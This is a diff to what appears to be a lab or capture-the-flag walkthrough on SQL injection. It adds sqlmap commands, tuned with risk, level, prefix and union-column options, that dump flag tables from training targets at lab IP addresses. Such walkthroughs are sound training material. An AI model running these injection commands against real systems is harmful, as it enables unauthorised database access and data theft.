@@ -54,3 +54,34 @@ sqlmap -u 'http://94.237.57.211:53268/case4.php' -H 'Content-Type: application/j
 ```
 
 <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### Attack Tuning
+
+#### Preguntas
+
+**What's the contents of table flag5? (Case #5)**
+
+```
+sqlmap -u 'http://94.237.50.221:57391/case5.php?id=1' -T flag5 --no-cast --dump --batch --risk 3 --level 5
+```
+
+<figure><img src="../.gitbook/assets/image (1709).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**What's the contents of table flag6? (Case #6)**
+
+```
+sqlmap -u 'http://94.237.50.221:57391/case6.php?col=id' -T flag6 --dump --batch --risk 3 --level 5 --prefix='`)'
+```
+
+<figure><img src="../.gitbook/assets/image (1710).png" alt=""><figcaption></figcaption></figure>
+
+**What's the contents of table flag7? (Case #7)**
+
+```
+sqlmap -u 'http://94.237.50.221:57391/case7.php?id=1' --union-cols 5-8 --level=3 --risk=3 --dump -T flag7 --techniqu
+e=U -D testdb
+```
+
+<figure><img src="../.gitbook/assets/image (1711).png" alt=""><figcaption></figcaption></figure>
